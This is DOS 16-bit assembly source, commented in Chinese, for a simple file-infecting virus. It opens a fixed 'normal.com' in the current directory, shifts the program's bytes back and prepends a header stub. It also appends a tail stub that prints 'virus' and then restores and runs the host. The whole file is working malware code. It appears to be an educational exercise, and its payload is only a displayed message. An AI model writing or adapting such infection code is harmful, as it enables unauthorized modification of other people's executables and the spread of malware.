org 100h
;程序从此到HdrVirusStart是复制感染部分，感染的是固定的本目录下的normal.com文件
;HdrVirusStart到HdrVirusEnd是头部的病毒部分，EndVirusStart到EndVirusEnd是尾部的病毒部分

push bp
mov bp, sp
sub sp, LocalVarSize

;    open file
mov ax, 3d02h;ah为3d表示打开文件，al=0只读方式，1=只写，2=读写方式
mov dx, FileName
int 21h
jnc Normal
mov ax, Fail
jmp ax
Normal:
mov [bp - pFileHd], ax; save filehandle，后面文件操作要用

;get file size
mov ax, 4202h;从最后一个字节开始偏移
mov cx, 0  ;offset is cx:dx
mov dx, 0 
mov bx, [bp - pFileHd]
int 21h
mov [bp - pFileSize], ax

;将被感染文件增加HdrVirusSize大小，以便将原文件内容后移HdrVirusSize
mov bx, [bp - pFileHd]
mov si, HdrVirusSize;用si做计数器，循环后写si个字节，从而扩容
_loop1:
; write file 
mov cx, 1;写一个字节
mov dx, Buf
mov ah, 40h
int 21h
dec si;如果计数器不归零，则继续向尾部写一个字节
jnz _loop1

;将原文件后移HdrVirusSize

mov di, [bp - pFileSize]; set des offset
mov si, di;set src offset
dec si
mov [Count], di
add di, HdrVirusSize
dec di
mov bx, [bp - pFileHd];set file handle

_loop3
; read from old file
mov ax, 4200h;al=00从头开始计算偏移
mov cx, 0  ;offset is cx:dx
mov dx, si
int 21h
mov cx, 1
mov dx, Buf
mov ah, 3fh
int 21h

; write to end
mov ax, 4200h;al=00从头开始计算偏移
mov cx, 0  ;offset is cx:dx
mov dx, di
int 21h
mov cx, 1
mov dx, Buf
mov ah, 40h
int 21h

dec si
dec di
mov ax, [Count]
dec ax
mov [Count], ax
jnz _loop3

;将病毒写入头部
mov ax, 4200h;al=00从头开始计算偏移
mov cx, 0  ;offset is cx:dx
mov dx, 0
int 21h
mov cx, HdrVirusSize
mov dx, HdrVirusStart
mov ah, 40h
int 21h

;填写被感染文件原始长度
mov ax, 4200h;al=00从头开始计算偏移
mov cx, 0  ;offset is cx:dx
mov dx, HdrVirusSize - 2
int 21h
mov cx, 2
lea dx, [bp - pFileSize]
mov ah, 40h
int 21h

;将病毒写入尾部
mov ax, 4200h;al=00从头开始计算偏移
mov cx, 0  ;offset is cx:dx
mov dx, [bp - pFileSize]
add dx, HdrVirusSize
int 21h
mov cx, EndVirusSize
mov dx, EndVirusStart
mov ah, 40h
int 21h


;  close file
mov ah, 3eh ;close file
int 21h
jmp end

Fail:
mov ax, FailToOpen
call StrLen

mov cx, ax
mov ax, FailToOpen
call DispStr

end:
add sp, LocalVarSize
pop bp
ret

HdrVirusStart: ;被拷贝到头部的病毒代码开始部分
call AA
AA: pop bp
sub bp, AA
push bp
mov dl, 8
mov ax, Msg
add ax, bp
mov cx, 5
call DispStr
pop bp
mov si, HdrVirusEnd
add si, bp 
mov di, $$
mov bx, InfectedFileSize
add bx, bp
mov cx, [bx]
mov bx, cx
add bx, HdrVirusSize
add bx, $$
jmp bx
DispStr:
	mov	bp, ax			; ES:BP = 串地址	
	mov	ax, 01301h		; AH = 13,  AL = 01h
	mov	bx, 000ch		; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮)	
	int	10h			; 10h 号中断
	ret
Msg: db "virus"
InfectedFileSize: dw 0x0000

HdrVirusEnd:;被拷贝到头部的病毒代码结束于此


EndVirusStart:;被拷贝到尾部的病毒代码开始部分

_loop2:
mov al, [si]
mov byte [di], al
inc si
inc di
dec cx
jnz _loop2
mov ax, $$;不能直接jmp $$因为用的是offset，而通过植入代码，offset都变了
jmp ax

EndVirusEnd:;被拷贝到尾部的病毒代码结束于此	
	
StrLen:
  mov si, ax
  mov cx, ax  
_loop:  
  mov ax, [si]
  inc si
  test ax, ax
  jnz _loop
  dec si
  sub si, cx
  mov ax, si
  ret
  
FileName: db "normal.com", 0
FailToOpen: db "fail to open", 0
Buf: db 0
Count: dw 0000h
pFileHd equ 2
pFileSize equ pFileHd + 2 
LocalVarSize equ pFileSize
HdrVirusSize equ HdrVirusEnd - HdrVirusStart
EndVirusSize equ EndVirusEnd - EndVirusStart
VirusSize equ EndVirusSize + HdrVirusSize;总病毒的大小